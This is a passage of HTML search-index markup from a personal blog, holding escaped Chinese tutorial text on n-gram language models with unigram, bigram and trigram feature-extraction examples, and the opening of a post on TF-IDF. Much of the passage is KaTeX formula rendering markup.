style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:3.106005em;vertical-align:-1.277669em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mop op-limits&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.8283360000000002em;&#34;&gt;&lt;span style=&#34;top:-1.872331em;margin-left:0em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mrel mtight&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.050005em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span&gt;&lt;span class=&#34;mop op-symbol large-op&#34;&gt;∑&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-4.3000050000000005em;margin-left:0em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.277669em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;∣&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;其中&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Context&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;就是词语的上下文，例如&lt;strong&gt;我可&lt;/strong&gt;的&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Context&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;就是：&lt;strong&gt;燕子、没有你&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;而N-gram假设一个词的之和前N个词相关，即马尔可夫模型的思想。&lt;/p&gt;
&lt;h3 id=&#34;向量表示&#34;&gt;向量表示&lt;/h3&gt;
&lt;p&gt;N-Gram是一种基于&lt;strong&gt;统计语言模型&lt;/strong&gt;的算法。它的基本思想是将文本里面的内容按照字节进行大小为N的滑动窗口操作，形成了长度是N的字节片段序列。&lt;/p&gt;
&lt;p&gt;每一个字节片段称为gram，对所有gram的出现频度进行统计，并且按照事先设定好的阈值进行过滤，形成关键gram列表，也就是这个文本的向量特征空间，列表中的每一种gram就是一个特征向量维度。&lt;/p&gt;
&lt;p&gt;例子&lt;br&gt;
比如我们现在使用&lt;strong&gt;单元Unigram&lt;/strong&gt;、&lt;strong&gt;二元的Bi-gram&lt;/strong&gt;和&lt;strong&gt;三元的Tri-gram&lt;/strong&gt;模型来进行特征提取。&lt;/p&gt;
&lt;p&gt;我们的训练样本为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;我去了北京天安门&lt;/li&gt;
&lt;li&gt;我是中国人&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那么我们对每一个样本进行单元Unigram、二元的Bi-gram和三元的Tri-gram模型提取。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;单元Unigram&lt;br&gt;
&lt;strong&gt;我去了北京天安门&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/我/去了/北京/天安门/&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;我是中国人&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/我/是/中国人/&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;二元Bi-gram&lt;br&gt;
&lt;strong&gt;我去了北京天安门&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/我 去了/去了 北京/北京 天安门/&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;我是中国人&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/我 是/是 中国人/&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;三元Tri-gram&lt;br&gt;
&lt;strong&gt;我去了北京天安门&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/我 去了 北京/去了 北京 天安门/&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;我是中国人&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/我 是 中国人/&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那么从上面可以得出，我们的特征向量包含我在训练数据中利用单元Unigram，二元Bi-gram，以及三元Tri-gram抽取出的不同特征，组成我的特征向量维度。&lt;/p&gt;
&lt;p&gt;然后以后对应一句话，直接进行Unigram，Bi-gram，Tri-gram进行抽取特征，出现哪个特征，就统计它的频数，最后填在特征向量中即可。&lt;/p&gt;
&lt;p&gt;比如上面的特征向量我列举一下顺序如：&lt;/p&gt;
&lt;p&gt;我、是、中国人、去了、北京、天安门、我 是、是 中国人、我 去了、去了 北京、北京 天安门、我 去了 北京、去了 北京 天安门、 我 是 中国人。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;抽取特征过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那么对于一句话&lt;strong&gt;我是中国人&lt;/strong&gt;进行N-gram特征抽取的方法是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;单元Unigram来说&lt;br&gt;
&lt;strong&gt;我是中国人&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/我/是/中国人/&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;二元Bi-gram&lt;br&gt;
&lt;strong&gt;我是中国人&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/我 是/是 中国人/&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;三元Tri-gram&lt;br&gt;
&lt;strong&gt;我是中国人&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/我 是 中国人/&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;于是我们就在出现的词语维度赋值为1，其余没有出现过的特征赋值为0，相当于one-hot特征，得到特征向量：&lt;code&gt;[1,1,1,0,0,0,1,1,0,0,0,0,0,0,1]&lt;/code&gt;，得到的这个特征向量就是我们使用N-gram提取特征方法提取出来的特征。&lt;/p&gt;
&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
&lt;p&gt;如果我们使用N-gram提取特征，使用unigram，bigram，trigram提取特征的情况，在词汇表大小为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;V&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;的时候，特征向量维度长度为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[V(unigram)+V^2(bigram)+V^3(trigram)]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;。&lt;/p&gt;
">n-gram</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/tf-idf-bm25/"" data-c="
          &lt;h2 id=&#34;tf-idf&#34;&gt;TF-IDF&lt;/h2&gt;
&lt;p&gt;TF-IDF（term frequency–inverse document frequency，词频-逆向文件频率）是一种用于信息检索（information retrieval）与文本挖掘（text mining）的常用加权技术。TF-IDF是一种&lt;strong&gt;统计方法&lt;/strong&gt;，用以评估一字词对于一个文件集或一个语料库中的其中一份文件的重要程度。字词的重要性随着它在文件中出现的次数成正比增加，但同时会随着它在语料库中出现的频率成反比下降。&lt;/p&gt;
&lt;p&gt;TF-IDF的主要思想是：&lt;strong&gt;如果某个单词在一篇文章中出现的频率TF高，并且在其他文章中很少出现，则认为此词或者短语具有很好的类别区分能力，适合用来分类&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&#34;tfterm-frequency&#34;&gt;TF(Term Frequency)&lt;/h3&gt;
&lt;p&gt;词频(TF)：表示词条（关键字）在文本中出现的频率，这个数字通常会被归一化(一般是词频除以文章总词数), 以防止它偏向长的文件。&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;在&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;一&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;类&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;中&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;词&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;条&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;出&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;现&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;的&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;次&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;数&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;该&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;类&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;中&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;所&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;有&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;的&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;词&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;条&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;数&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;目&lt;/mi&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;TF_w = \frac{在一类中词条w出现的次数}{该类中所有的词条数目}
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.7935600000000003em;vertical-align:-0.686em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.10756em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;该&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;类&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;中&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;所&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;有&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;词&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;条&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;目&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; 